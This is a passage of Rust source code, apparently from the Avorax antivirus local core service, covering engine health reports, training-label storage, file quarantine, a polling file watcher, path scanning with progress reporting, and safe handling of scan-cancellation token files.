                    "ai_self_test": ai_self_test_ok,
                    "ai_self_test_error": ai_self_test_error,
                    "core_service_status": core_service_status.status,
                    "core_service_status_error": core_service_status.error,
                    "guard_status": guard_status.status,
                    "guard_status_error": guard_status.error,
                    "driver_status": "missing",
                    "process_monitor_status": protection::process_monitor::ProcessMonitor::status(),
                    "process_monitor_capability": protection::process_monitor::ProcessMonitor::capability(),
                    "process_monitor_status_reason": protection::process_monitor::ProcessMonitor::status_reason(),
                    "behavior_monitor_status": protection::behavior_monitor::BehaviorMonitor::status(),
                    "behavior_monitor_status_reason": protection::behavior_monitor::BehaviorMonitor::status_reason(),
                    "reputation_status": ReputationProvider.status(),
                    "reputation_status_reason": ReputationProvider.status_reason(),
                    "ipc": "stdio",
                    "network_exposed": false,
                    "install_path": asset_root,
                    "engine_directory": engine_dir,
                    "engine_paths_checked": locator.paths_checked,
                    "signatures_dir": locator.signatures_dir,
                    "rules_dir": locator.rules_dir,
                    "ml_dir": locator.ml_dir,
                    "trust_dir": locator.trust_dir,
                    "config_dir": locator.config_dir,
                    "program_data_dir": program_data_dir.path,
                    "program_data_dir_error": program_data_dir.error,
                }),
            })
        }
        Err(error) => native_engine_unavailable_health_response(
            format!("{error:#}"),
            ai_self_test_ok,
            ai_self_test_error,
            program_data_dir,
            core_service_status,
            guard_status,
            Some(&locator),
        ),
    }
}

fn native_engine_unavailable_health_response(
    error_text: String,
    ai_self_test_ok: bool,
    ai_self_test_error: Option<String>,
    program_data_dir: ProgramDataDirReport,
    core_service_status: CoreServiceStatusReport,
    guard_status: protection::guard_service::GuardServiceStatusReport,
    locator: Option<&EngineAssetLocator>,
) -> serde_json::Value {
    let asset_root = locator.map(|locator| locator.asset_root.clone());
    let engine_dir = locator.map(|locator| locator.installed_engine_dir.clone());
    let signatures_dir = locator.map(|locator| locator.signatures_dir.clone());
    let rules_dir = locator.map(|locator| locator.rules_dir.clone());
    let ml_dir = locator.map(|locator| locator.ml_dir.clone());
    let trust_dir = locator.map(|locator| locator.trust_dir.clone());
    let config_dir = locator.map(|locator| locator.config_dir.clone());
    let paths_checked = match locator {
        Some(locator) => locator.paths_checked.clone(),
        None => Vec::new(),
    };

    let mut body = serde_json::Map::new();
    body.insert("engine_status".to_string(), json!("error"));
    body.insert("native_engine_status".to_string(), json!("error"));
    body.insert("native_signature_count".to_string(), json!(0));
    body.insert("native_rule_count".to_string(), json!(0));
    body.insert("native_ml_status".to_string(), json!("modelMissing"));
    body.insert(
        "native_ml_model_version".to_string(),
        serde_json::Value::Null,
    );
    body.insert("native_ml_production_ready".to_string(), json!(false));
    body.insert("native_self_test".to_string(), json!(false));
    body.insert(
        "native_self_test_error".to_string(),
        json!(error_text.clone()),
    );
    body.insert("native_error".to_string(), json!(error_text.clone()));
    body.insert("compatibility_engines_enabled".to_string(), json!(false));
    body.insert("yara_status".to_string(), json!("compatDisabled"));
    body.insert("yara_rule_count".to_string(), json!(0));
    body.insert(
        "ai_status".to_string(),
        json!(ai::ModelRunner::default().status()),
    );
    body.insert(
        "ai_model".to_string(),
        json!(ai::ModelRunner::default().info()),
    );
    body.insert("ai_self_test".to_string(), json!(ai_self_test_ok));
    body.insert("ai_self_test_error".to_string(), json!(ai_self_test_error));
    body.insert(
        "core_service_status".to_string(),
        json!(core_service_status.status),
    );
    body.insert(
        "core_service_status_error".to_string(),
        json!(core_service_status.error),
    );
    body.insert("guard_status".to_string(), json!(guard_status.status));
    body.insert("guard_status_error".to_string(), json!(guard_status.error));
    body.insert("driver_status".to_string(), json!("missing"));
    body.insert(
        "process_monitor_status".to_string(),
        json!(protection::process_monitor::ProcessMonitor::status()),
    );
    body.insert(
        "process_monitor_capability".to_string(),
        json!(protection::process_monitor::ProcessMonitor::capability()),
    );
    body.insert(
        "process_monitor_status_reason".to_string(),
        json!(protection::process_monitor::ProcessMonitor::status_reason()),
    );
    body.insert(
        "behavior_monitor_status".to_string(),
        json!(protection::behavior_monitor::BehaviorMonitor::status()),
    );
    body.insert(
        "behavior_monitor_status_reason".to_string(),
        json!(protection::behavior_monitor::BehaviorMonitor::status_reason()),
    );
    body.insert(
        "reputation_status".to_string(),
        json!(ReputationProvider.status()),
    );
    body.insert(
        "reputation_status_reason".to_string(),
        json!(ReputationProvider.status_reason()),
    );
    body.insert("ipc".to_string(), json!("stdio"));
    body.insert("network_exposed".to_string(), json!(false));
    body.insert("install_path".to_string(), json!(asset_root));
    body.insert("engine_directory".to_string(), json!(engine_dir));
    body.insert("engine_paths_checked".to_string(), json!(paths_checked));
    body.insert("signatures_dir".to_string(), json!(signatures_dir));
    body.insert("rules_dir".to_string(), json!(rules_dir));
    body.insert("ml_dir".to_string(), json!(ml_dir));
    body.insert("trust_dir".to_string(), json!(trust_dir));
    body.insert("config_dir".to_string(), json!(config_dir));
    body.insert("program_data_dir".to_string(), json!(program_data_dir.path));
    body.insert(
        "program_data_dir_error".to_string(),
        json!(program_data_dir.error),
    );
    body.insert("last_error".to_string(), json!(error_text));

    json!(CoreResponse {
        ok: true,
        body: serde_json::Value::Object(body),
    })
}

fn display_file_name(path: &Path) -> String {
    match display_file_leaf_name(path) {
        Some(name) => name,
        None => display_file_path_fallback(path),
    }
}

fn display_file_leaf_name(path: &Path) -> Option<String> {
    path.file_name()
        .map(|value| value.to_string_lossy().to_string())
        .filter(|value| !value.trim().is_empty())
}

fn display_file_path_fallback(path: &Path) -> String {
    path.display().to_string()
}

fn save_training_label(
    path: &Path,
    raw_label: &str,
    user_note: Option<String>,
    previous_verdict: String,
) -> anyhow::Result<String> {
    use ai::feature_extractor::{extract_static_features, LocationCategory};
    use ai::training_labels::{TrainingLabel, TrainingLabelStore, UserTrainingLabel};

    let user_label = match raw_label {
        "falsePositive" => UserTrainingLabel::FalsePositive,
        "confirmedMalicious" => UserTrainingLabel::ConfirmedMalicious,
        "trustedApp" => UserTrainingLabel::TrustedApp,
        "potentiallyUnwantedButAllowed" => UserTrainingLabel::PotentiallyUnwantedButAllowed,
        _ => UserTrainingLabel::Unsure,
    };
    let features = extract_static_features(path)?;
    let path_category = match &features.location_category {
        LocationCategory::Downloads => "downloads",
        LocationCategory::Temp => "temp",
        LocationCategory::Startup => "startup",
        LocationCategory::System => "system",
        LocationCategory::ProgramFiles => "programFiles",
        LocationCategory::UserProfile => "userProfile",
        LocationCategory::Unknown => "unknown",
    }
    .to_string();
    let label = TrainingLabel {
        label_id: String::new(),
        file_sha256: sha256_for_file(path)?,
        file_name: display_file_name(path),
        file_path_category: path_category,
        extracted_features: features,
        previous_verdict,
        user_label,
        user_note,
        created_at: Utc::now(),
        app_version: env!("CARGO_PKG_VERSION").to_string(),
        model_version: ai::ModelRunner::default().status().to_string(),
    };
    let store = TrainingLabelStore::new()?;
    store.append(label)?;
    Ok(store.path().display().to_string())
}

fn quarantine_selected_file(
    path: &Path,
    threat_name: &str,
    engine: &str,
) -> anyhow::Result<quarantine::QuarantineRecord> {
    let result = scanner::ScanResult {
        status: ScanStatus::Infected,
        scanned_path: path.display().to_string(),
        sha256: sha256_for_file(path)?,
        engine: engine.to_string(),
        signature_name: None,
        threat_name: Some(threat_name.to_string()),
        scanned_at: Utc::now(),
        duration_ms: 0,
        raw_engine_summary: Some("Manual quarantine from Avorax UI".to_string()),
    };
    QuarantineStore::new()?.quarantine_file(path, &result)
}

fn run_watch_poll_scan(
    requested_paths: Vec<PathBuf>,
    action_mode: ScanActionMode,
    kind: ScanKind,
    duration_ms: u64,
    poll_interval_ms: u64,
    max_events: usize,
) -> anyhow::Result<(WatcherState, WatchPollScanSummary)> {
    let watcher = WatcherState::from_requested_paths(requested_paths);
    let roots: Vec<PathBuf> = watcher.watched_paths.iter().map(PathBuf::from).collect();
    let mut limitations = vec![
        "finite-polling-session-only",
        "post-write-detection-only",
        "bounded-polling-limits",
        "no-persistent-service-monitor",
        "no-kernel-pre-execution-blocking",
    ];
    let mut scan_errors = Vec::new();
    if roots.is_empty() {
        limitations.push("no-accessible-watch-paths");
        return Ok((
            watcher,
            WatchPollScanSummary {
                active: false,
                mode: "stopped",
                duration_ms,
                poll_interval_ms,
                max_events,
                initial_files_observed: 0,
                polls_completed: 0,
                events_observed: 0,
                files_scanned: 0,
                threats_found: 0,
                quarantined_files: 0,
                scan_errors,
                limitations,
                events: Vec::new(),
            },
        ));
    }

    let command_started_at_ms = current_system_time_ms();
    let initial_snapshot =
        collect_watch_candidates(&roots, WATCH_POLL_MAX_FILES_PER_PASS, WATCH_POLL_MAX_DEPTH);
    for error in initial_snapshot.scan_errors {
        push_scan_error(&mut scan_errors, format!("watch baseline: {error}"));
    }
    if initial_snapshot.limit_reached {
        limitations.push("watch-poll-file-limit-reached");
    }
    let initial_files_observed = initial_snapshot.candidates.len();
    let mut known_files: HashMap<PathBuf, WatchFileFingerprint> = initial_snapshot
        .candidates
        .into_iter()
        .filter(|candidate| candidate.modified_at_ms < command_started_at_ms)
        .map(|candidate| {
            (
                candidate.path,
                WatchFileFingerprint {
                    size_bytes: candidate.size_bytes,
                    modified_at_ms: candidate.modified_at_ms,
                },
            )
        })
        .collect();

    let started = Instant::now();
    let duration = Duration::from_millis(duration_ms);
    let poll_interval = Duration::from_millis(poll_interval_ms);
    let mut monitor = UserModeFileMonitor::new(Duration::from_millis(WATCH_POLL_DEBOUNCE_MS), 2);
    let mut polls_completed = 0_u64;
    let mut events = Vec::new();
    let mut files_scanned = 0_u64;
    let mut threats_found = 0_u64;
    let mut quarantined_files = 0_u64;

    while started.elapsed() < duration && events.len() < max_events {
        thread::sleep(poll_interval);
        polls_completed = polls_completed.saturating_add(1);
        let snapshot =
            collect_watch_candidates(&roots, WATCH_POLL_MAX_FILES_PER_PASS, WATCH_POLL_MAX_DEPTH);
        for error in snapshot.scan_errors {
            push_scan_error(&mut scan_errors, format!("watch poll: {error}"));
        }
        if snapshot.limit_reached && !limitations.contains(&"watch-poll-file-limit-reached") {
            limitations.push("watch-poll-file-limit-reached");
        }

        for candidate in snapshot.candidates {
            if events.len() >= max_events {
                break;
            }
            let fingerprint = WatchFileFingerprint {
                size_bytes: candidate.size_bytes,
                modified_at_ms: candidate.modified_at_ms,
            };
            if known_files.get(&candidate.path) == Some(&fingerprint) {
                continue;
            }
            let observed_at_ms = started.elapsed().as_millis().min(u128::from(u64::MAX)) as u64;
            match monitor.evaluate_event(WatchEvent::modified_with_file_time(
                candidate.path.clone(),
                candidate.size_bytes,
                candidate.modified_at_ms,
                observed_at_ms,
            )) {
                WatchEvaluation::WaitForDebounce | WatchEvaluation::WaitForStableFile => {}
                WatchEvaluation::AlreadyScannedUnchanged => {
                    known_files.insert(candidate.path, fingerprint);
                }
                WatchEvaluation::ScanRequired { reason } => {
                    let report = scan_paths(
                        vec![candidate.path.clone()],
                        action_mode.clone(),
                        kind.clone(),
                        None,
                    )?;
                    files_scanned = files_scanned.saturating_add(report.files_scanned);
                    threats_found = threats_found.saturating_add(report.threats_found);
                    quarantined_files = quarantined_files.saturating_add(report.quarantined_files);
                    for error in &report.scan_errors {
                        push_scan_error(&mut scan_errors, format!("watch scan: {error}"));
                    }
                    events.push(WatchPollScanEvent {
                        path: candidate.path.display().to_string(),
                        reason,
                        scan_status: report.status,
                        threats_found: report.threats_found,
                        quarantined_files: report.quarantined_files,
                    });
                    known_files.insert(candidate.path, fingerprint);
                }
            }
        }
    }

    Ok((
        watcher,
        WatchPollScanSummary {
            active: true,
            mode: "finiteUserModePolling",
            duration_ms,
            poll_interval_ms,
            max_events,
            initial_files_observed,
            polls_completed,
            events_observed: events.len(),
            files_scanned,
            threats_found,
            quarantined_files,
            scan_errors,
            limitations,
            events,
        },
    ))
}

fn current_system_time_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .ok()
        .map(|duration| duration.as_millis().min(u128::from(u64::MAX)) as u64)
        .unwrap_or(0)
}

fn scan_paths(
    roots: Vec<PathBuf>,
    action_mode: ScanActionMode,
    kind: ScanKind,
    mut emit_progress: Option<&mut dyn FnMut(&ScanProgress)>,
) -> anyhow::Result<scanner::ScanReport> {
    let started = Instant::now();
    let started_at = Utc::now();
    clear_scan_cancellation()?;
    let job = ScanJob::new(kind.clone());
    let mut files_scanned: u64 = 0;
    let mut bytes_scanned: u64 = 0;
    let mut skipped_files: u64 = 0;
    let mut permission_denied_count: u64 = 0;
    let mut threats = Vec::new();
    let mut suspicious_found: u64 = 0;
    let mut quarantined_files: u64 = 0;
    let mut cancelled = false;
    let mut cancelled_remaining_files: u64 = 0;
    let mut last_path = None;
    let mut scan_errors = Vec::new();
    let mut native_engine = match native_engine() {
        Ok(engine) => Some(engine),
        Err(error) => {
            push_scan_error(
                &mut scan_errors,
                format!("native engine unavailable: {error:#}"),
            );
            None
        }
    };
    let engine_unavailable = native_engine.is_none();

    let walk = if kind == ScanKind::Quick {
        collect_accessible_files_with_options(&roots, &WalkOptions::quick())
    } else {
        collect_accessible_files(&roots)
    };
    skipped_files += walk.skipped_files;
    permission_denied_count += walk.permission_denied_count;
    for error in &walk.scan_errors {
        push_scan_error(&mut scan_errors, error.clone());
    }
    let total_files = walk.files.len() as u64;
    let total_bytes = walk.bytes_estimated;
    if engine_unavailable {
        skipped_files = skipped_files.saturating_add(total_files);
    }
    let mut progress = ScanProgress {
        job_id: job.id.clone(),
        scan_type: kind.clone(),
        status: ScanJobStatus::Running,
        current_path: None,
        files_scanned: 0,
        folders_scanned: walk.folders_scanned,
        bytes_scanned: 0,
        total_files_estimated: Some(total_files),
        total_bytes_estimated: Some(total_bytes),
        threats_found: 0,
        suspicious_found: 0,
        skipped_files,
        permission_denied_count,
        started_at,
        updated_at: Utc::now(),
        elapsed_seconds: 0,
        estimated_remaining_seconds: None,
        progress_percent: None,
    };
    progress.calculate_eta();
    if let Some(emit) = emit_progress.as_deref_mut() {
        emit(&progress);
    }

    for (index, path) in walk.files.into_iter().enumerate() {
        if scan_cancellation_requested()? {
            cancelled = true;
            cancelled_remaining_files = total_files.saturating_sub(index as u64);
            skipped_files = skipped_files.saturating_add(cancelled_remaining_files);
            push_scan_error(
                &mut scan_errors,
                format!(
                    "scan cancelled by user request; skipped {cancelled_remaining_files} remaining file(s)"
                ),
            );
            break;
        }
        if kind == ScanKind::Full && started.elapsed().as_secs() >= FULL_SCAN_MAX_SECONDS {
            let remaining_files = total_files.saturating_sub(index as u64);
            skipped_files = skipped_files.saturating_add(remaining_files);
            push_scan_error(
                &mut scan_errors,
                format!(
                    "{}: full scan time budget reached; skipped {remaining_files} remaining file(s)",
                    path.display()
                ),
            );
            break;
        }
        let Some(engine) = native_engine.as_mut() else {
            break;
        };
        let current = path.display().to_string();
        last_path = Some(current.clone());
        let file_size = match inspect_regular_scan_target(&path, "scan target") {
            Ok(metadata) => metadata.len(),
            Err(error) => {
                skipped_files = skipped_files.saturating_add(1);
                push_scan_error(
                    &mut scan_errors,
                    format!("{}: metadata failed before scan: {error}", path.display()),
                );
                update_progress(
                    &mut progress,
                    &current,
                    files_scanned,
                    bytes_scanned,
                    threats.len() as u64,
                    suspicious_found,
                    skipped_files,
                    permission_denied_count,
                    started,
                );
                if let Some(emit) = emit_progress.as_deref_mut() {
                    emit(&progress);
                }
                continue;
            }
        };
        match engine.scan_file(path.clone(), AneScanActionMode::DetectOnly) {
            Ok(verdict) => {
                files_scanned += 1;
                bytes_scanned = bytes_scanned.saturating_add(file_size);
                if should_surface_native_verdict(verdict.final_verdict.verdict) {
                    let mut threat = threat_from_native(&path, &verdict);
                    suspicious_found += u64::from(threat.confidence != ThreatConfidence::Confirmed);
                    let allowlisted = match AllowlistStore::new() {
                        Ok(store) => store.is_allowlisted(&path, &threat.sha256),
                        Err(error) => {
                            push_scan_error(
                                &mut scan_errors,
                                format!("allowlist unavailable: {error:#}"),
                            );
                            false
                        }
                    };
                    if allowlisted {
                        threat.status = ThreatResultStatus::Allowlisted;
                        threat.recommended_action = RecommendedAction::Allowlist;
                    } else if native_should_quarantine(action_mode.clone(), &threat) {
                        match quarantine_selected_file(&path, &threat.threat_name, &threat.engine) {
                            Ok(record) => {
                                threat.status = ThreatResultStatus::Quarantined;
                                threat.path = record.original_path;
                                threat.quarantine_id = Some(record.quarantine_id);
                                threat.quarantine_path = Some(record.quarantine_path);
                                threat.quarantine_action_taken = Some(record.action_taken);
                                quarantined_files += 1;
                            }
                            Err(error) => {
                                push_scan_error(
                                    &mut scan_errors,
                                    format!(
                                        "{}: auto-quarantine failed: {error:#}",
                                        path.display()
                                    ),
                                );
                            }
                        }
                    }
                    threats.push(threat);
                } else if let Some(detail) = native_archive_content_scan_limited_detail(&verdict) {
                    skipped_files = skipped_files.saturating_add(1);
                    push_scan_error(&mut scan_errors, format!("{}: {detail}", path.display()));
                }
            }
            Err(error) => {
                if windows_antimalware_blocked_scan_error(&error) {
                    threats.push(threat_from_windows_antimalware_block(
                        &path, file_size, &error,
                    ));
                    push_scan_error(
                        &mut scan_errors,
                        format!(
                            "{}: Windows anti-malware blocked file access; surfaced as a confirmed detection, but Avorax could not read the file for quarantine: {error:#}",
                            path.display()
                        ),
                    );
                } else {
                    skipped_files = skipped_files.saturating_add(1);
                    push_scan_error(
                        &mut scan_errors,
                        format!("{}: native scan failed: {error:#}", path.display()),
                    );
                }
            }
        }
        update_progress(
            &mut progress,
            &current,
            files_scanned,
            bytes_scanned,
            threats.len() as u64,
            suspicious_found,
            skipped_files,
            permission_denied_count,
            started,
        );
        if files_scanned == total_files || files_scanned % 25 == 0 {
            if let Some(emit) = emit_progress.as_deref_mut() {
                emit(&progress);
            }
        }
    }

    let status = if cancelled {
        ReportStatus::Cancelled
    } else if !threats.is_empty() {
        ReportStatus::ThreatsFound
    } else if engine_unavailable {
        ReportStatus::EngineUnavailable
    } else if skipped_files > 0 {
        ReportStatus::CompletedWithErrors
    } else {
        ReportStatus::Clean
    };
    progress.status = if status == ReportStatus::Cancelled {
        ScanJobStatus::Cancelled
    } else if status == ReportStatus::Failed {
        ScanJobStatus::Failed
    } else {
        ScanJobStatus::Completed
    };
    progress.updated_at = Utc::now();
    progress.elapsed_seconds = started.elapsed().as_secs();
    progress.files_scanned = files_scanned;
    progress.bytes_scanned = bytes_scanned;
    progress.threats_found = threats.len() as u64;
    progress.suspicious_found = suspicious_found;
    progress.skipped_files = skipped_files;
    progress.permission_denied_count = permission_denied_count;
    if cancelled {
        progress.progress_percent = None;
        progress.estimated_remaining_seconds = None;
    } else {
        progress.progress_percent = Some(100.0);
        progress.estimated_remaining_seconds = Some(0);
    }
    if let Some(emit) = emit_progress.as_deref_mut() {
        emit(&progress);
    }
    if cancelled {
        clear_scan_cancellation()?;
    }
    Ok(scanner::ScanReport {
        status,
        kind: kind.clone(),
        action_mode,
        files_scanned,
        folders_scanned: walk.folders_scanned,
        bytes_scanned,
        total_files_estimated: Some(total_files),
        total_bytes_estimated: Some(total_bytes),
        threats_found: threats.len() as u64,
        suspicious_found,
        quarantined_files,
        skipped_files,
        permission_denied_count,
        elapsed_ms: started.elapsed().as_millis(),
        current_path: last_path,
        message: if cancelled {
            Some(format!(
                "Scan cancelled by user request; {cancelled_remaining_files} queued file(s) were not scanned."
            ))
        } else if engine_unavailable {
            Some("Avorax Native Engine is unavailable; files were not reported clean.".to_string())
        } else if !scan_errors.is_empty() {
            Some(format!(
                "Scan completed with {} file error(s); skipped files were not reported clean.",
                scan_errors.len()
            ))
        } else if skipped_files > 0 || permission_denied_count > 0 {
            Some(format!(
                "Scan completed with {skipped_files} skipped file(s) and {permission_denied_count} permission-denied item(s); skipped files were not reported clean."
            ))
        } else if kind == ScanKind::Full {
            Some("Full Scan is optimized to finish within the scan budget by prioritizing risky files and skipping known cache/build folders.".to_string())
        } else if kind == ScanKind::Quick {
            Some(
                "Quick Scan checked high-risk startup, script, installer, archive, and executable locations only. Use Full Scan for exhaustive coverage."
                    .to_string(),
            )
        } else {
            None
        },
        scan_errors,
        threats,
        progress: Some(progress),
    })
}

fn push_scan_error(scan_errors: &mut Vec<String>, detail: String) {
    if scan_errors.len() < MAX_SCAN_ERROR_DETAILS {
        scan_errors.push(bounded_scan_error_detail(&detail));
    } else if let Some(last) = scan_errors.last_mut() {
        let notice = scan_error_omission_notice();
        if last != &notice {
            *last = notice;
        }
    }
}

fn scan_error_omission_notice() -> String {
    format!("additional scan errors omitted after {MAX_SCAN_ERROR_DETAILS} details")
}

fn bounded_scan_error_detail(detail: &str) -> String {
    let normalized = detail.replace('\0', "\\0");
    if normalized.chars().count() <= MAX_SCAN_ERROR_DETAIL_CHARS {
        return normalized;
    }
    let prefix_len = MAX_SCAN_ERROR_DETAIL_CHARS.saturating_sub(SCAN_ERROR_TRUNCATION_SUFFIX.len());
    let mut bounded: String = normalized.chars().take(prefix_len).collect();
    bounded.push_str(SCAN_ERROR_TRUNCATION_SUFFIX);
    bounded
}

fn inspect_regular_scan_target(path: &Path, label: &str) -> anyhow::Result<std::fs::Metadata> {
    let metadata = std::fs::symlink_metadata(path)
        .with_context(|| format!("failed to inspect {label} {}", path.display()))?;
    if metadata.file_type().is_symlink() {
        return Err(anyhow::anyhow!(
            "refusing to inspect symbolic link {label}: {}",
            path.display()
        ));
    }
    if scan_target_metadata_is_windows_reparse_point(&metadata) {
        return Err(anyhow::anyhow!(
            "refusing to inspect reparse point {label}: {}",
            path.display()
        ));
    }
    if !metadata.is_file() {
        return Err(anyhow::anyhow!(
            "{label} is not a regular file: {}",
            path.display()
        ));
    }
    Ok(metadata)
}

#[cfg(windows)]
fn scan_target_metadata_is_windows_reparse_point(metadata: &std::fs::Metadata) -> bool {
    use std::os::windows::fs::MetadataExt;
    const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x400;
    metadata.file_attributes() & FILE_ATTRIBUTE_REPARSE_POINT != 0
}

#[cfg(not(windows))]
fn scan_target_metadata_is_windows_reparse_point(_metadata: &std::fs::Metadata) -> bool {
    false
}

fn request_scan_cancellation() -> anyhow::Result<PathBuf> {
    let path = scan_cancellation_token_path()?;
    if let Some(parent) = path
        .parent()
        .filter(|parent| !parent.as_os_str().is_empty())
    {
        std::fs::create_dir_all(parent)?;
        ensure_runtime_directory(parent, "scan cancellation token parent")?;
    }
    let temp_path = path.with_extension(format!("tmp-{}", Uuid::new_v4()));
    write_runtime_file_exclusive(
        &temp_path,
        Utc::now().to_rfc3339().as_bytes(),
        "temporary scan cancellation token",
    )?;
    if let Err(error) = remove_existing_runtime_file(&path, "scan cancellation token") {
        cleanup_staged_local_core_file(&temp_path, "temporary scan cancellation token")
            .with_context(|| {
                format!(
                    "failed to clean up temporary scan cancellation token {} after activation preflight failed: {error:#}",
                    temp_path.display()
                )
            })?;
        return Err(error);
    }
    if let Err(error) = std::fs::rename(&temp_path, &path) {
        cleanup_staged_local_core_file(&temp_path, "temporary scan cancellation token")
            .with_context(|| {
                format!(
                    "failed to clean up temporary scan cancellation token {} after activation failed: {error:#}",
                    temp_path.display()
                )
            })?;
        return Err(error).with_context(|| {
            format!(
                "failed to activate scan cancellation token {}",
                path.display()
            )
        });
    }
    Ok(path)
}

fn clear_scan_cancellation() -> anyhow::Result<()> {
    let path = scan_cancellation_token_path()?;
    remove_existing_runtime_file(&path, "scan cancellation token")?;
    let temp_path = path.with_extension("tmp");
    remove_existing_runtime_file(&temp_path, "temporary scan cancellation token")?;
    Ok(())
}

fn cleanup_staged_local_core_file(path: &Path, label: &str) -> anyhow::Result<()> {
    match std::fs::remove_file(path) {
        Ok(()) => Ok(()),
        Err(error) if error.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(error) => {
            Err(error).with_context(|| format!("failed to remove {label} {}", path.display()))
        }
    }
}

fn scan_cancellation_requested() -> anyhow::Result<bool> {
    let path = scan_cancellation_token_path()?;
    optional_runtime_file_present(&path, "scan cancellation token")
}

fn scan_cancellation_token_path() -> anyhow::Result<PathBuf> {
    Ok(avorax_program_data_dir()?
        .join("runtime")
        .join("cancel-active-scan"))
}

fn ensure_runtime_metadata_safe(metadata: &std::fs::Metadata, label: &str) -> anyhow::Result<()> {
    if metadata.file_type().is_symlink() {
        return Err(anyhow::anyhow!("refusing to use symbolic link {label}"));
    }
    #[cfg(windows)]
    {
        use std::os::windows::fs::MetadataExt;
        const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x400;
        if metadata.file_attributes() & FILE_ATTRIBUTE_REPARSE_POINT != 0 {
            return Err(anyhow::anyhow!("refusing to use reparse point {label}"));
        }
    }
    Ok(())
}

fn ensure_runtime_directory(path: &Path, label: &str) -> anyhow::Result<()> {
    let metadata = std::fs::symlink_metadata(path)
        .with_context(|| format!("failed to inspect {label} {}", path.display()))?;
    ensure_runtime_metadata_safe(&metadata, label)?;
    if !metadata.is_dir() {
        return Err(anyhow::anyhow!("{label} is not a directory"));
    }
    Ok(())
}

fn optional_runtime_file_present(path: &Path, label: &str) -> anyhow::Result<bool> {
    match std::fs::symlink_metadata(path) {
        Ok(metadata) => {
            ensure_runtime_metadata_safe(&metadata, label)?;
            if !metadata.is_file() {
                return Err(anyhow::anyhow!("{label} is not a regular file"));
            }
            Ok(true)
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(false),
        Err(error) => {
            Err(error).with_context(|| format!("failed to inspect {label} {}", path.display()))
        }
    }
}

fn remove_existing_runtime_file(path: &Path, label: &str) -> anyhow::Result<()> {
    match std::fs::symlink_metadata(path) {
        Ok(metadata) => {
            ensure_runtime_metadata_safe(&metadata, label)?;
            if !metadata.is_file() {
                return Err(anyhow::anyhow!("{label} is not a regular file"));
            }
            std::fs::remove_file(path)
                .with_context(|| format!("failed to remove {label} {}", path.display()))?;
            Ok(())
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(error) => {
            Err(error).with_context(|| format!("failed to inspect {label} {}", path.display()))
        }
    }
}

fn write_runtime_file_exclusive(path: &Path, bytes: &[u8], label: &str) -> anyhow::Result<()> {
    let mut output = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(path)
        .with_context(|| format!("failed to create {label} {}", path.display()))?;
    output
        .write_all(bytes)
        .with_context(|| format!("failed to write {label} {}", path.display()))?;
    output
        .sync_all()
        .with_context(|| format!("failed to sync {label} {}", path.display()))?;
    Ok(())
}

#[allow(dead_code)]
fn should_surface_ai_result(result: &ai::model_runner::LocalAiResult) -> bool {
    matches!(
        result.verdict,
        ai::verdict::LocalAiVerdictLabel::Suspicious
            | ai::verdict::LocalAiVerdictLabel::ProbableMalware
            | ai::verdict::LocalAiVerdictLabel::ConfirmedMalware
    )
}

#[allow(clippy::too_many_arguments)]
fn update_progress(
    progress: &mut ScanProgress,
    current_path: &str,
    files_scanned: u64,
    bytes_scanned: u64,
    threats_found: u64,
    suspicious_found: u64,
    skipped_files: u64,
    permission_denied_count: u64,
    started: Instant,
) {
    progress.current_path = Some(current_path.to_string());
    progress.files_scanned = files_scanned;
    progress.bytes_scanned = bytes_scanned;
    progress.threats_found = threats_found;
    progress.suspicious_found = suspicious_found;
    progress.skipped_files = skipped_files;
    progress.permission_denied_count = permission_denied_count;
    progress.updated_at = Utc::now();
    progress.elapsed_seconds = started.elapsed().as_secs();
    progress.calculate_eta();
}

fn native_self_test_failure_detail(report: &AneSelfTestReport) -> String {
    let mut failed = Vec::new();
    if !report.eicar_detected {
        failed.push("eicar_detection");
    }
    if !report.signature_pack_loaded {
        failed.push("signature_pack_loaded");
    }
    if !report.rule_pack_loaded {
        failed.push("rule_pack_loaded");
    }
    let failed_detail = if failed.is_empty() {
        "none".to_string()
    } else {
        failed.join(",")
    };
    format!(
        concat!(
            "native self-test result was {}; ",
            "eicar_detected={}; ",
            "signature_pack_loaded={}; ",
            "rule_pack_loaded={}; ",
            "ml_model_loaded={}; ",
            "failed_prerequisites={}"
        ),
        report.overall_result,
        report.eicar_detected,
        report.signature_pack_loaded,
        report.rule_pack_loaded,
        report.ml_model_loaded,
        failed_detail
    )
}

fn native_self_test_status_and_error(
    result: Result<&AneSelfTestReport, &anyhow::Error>,
) -> (bool, Option<String>) {
    match result {
        Ok(report) if report.overall_result == "pass" => (true, None),
        Ok(report) => (false, Some(native_self_test_failure_detail(report))),
        Err(error) => (false, Some(format!("{error:#}"))),
    }
}

fn native_ml_status_label(status: &AneEngineStatus) -> &'static str {
    if !status.ml_model_loaded {
        return "modelMissing";
    }
    if status.ml_model_version.is_none() {
        return "error";
    }
    if !status.ml_model_production_ready {
        return "developmentModel";
    }
    "loaded"
}

fn native_engine() -> anyhow::Result<ZentorNativeEngine> {
    let root = EngineAssetLocator::discover()?.asset_root;
    ZentorNativeEngine::initialize(EngineConfig::from_repo_root(root)?)
}

#[derive(Debug, Clone)]
struct EngineAssetLocator {
    asset_root: PathBuf,
    installed_engine_dir: PathBuf,
    signatures_dir: PathBuf,
    rules_dir: PathBuf,
    ml_dir: PathBuf,
    trust_dir: PathBuf,
    config_dir: PathBuf,
    paths_checked: Vec<PathBuf>,
}

impl EngineAssetLocator {
    fn discover() -> anyhow::Result<Self> {
        let mut candidates = Vec::new();

        if let Some(engine) = absolute_engine_asset_env_path("AVORAX_ENGINE_DIR")? {
            if engine
                .file_name()
                .is_some_and(|name| name.to_string_lossy().eq_ignore_ascii_case("engine"))
            {
                push_engine_asset_root(&mut candidates, &engine_dir_parent_or_self(&engine))?;
            } else {
                push_engine_asset_root(&mut candidates, &engine)?;
            }
        }

        if let Some(root) = absolute_engine_asset_env_path("AVORAX_ENGINE_ROOT")? {
            push_engine_asset_root(&mut candidates, &root)?;
        }

        let exe = std::env::current_exe()
            .context("local-core native asset discovery failed to resolve current executable")?;
        let parent = exe.parent().ok_or_else(|| {
            anyhow::anyhow!(
                "local-core native asset discovery found no parent for {}",
                exe.display()
            )
        })?;
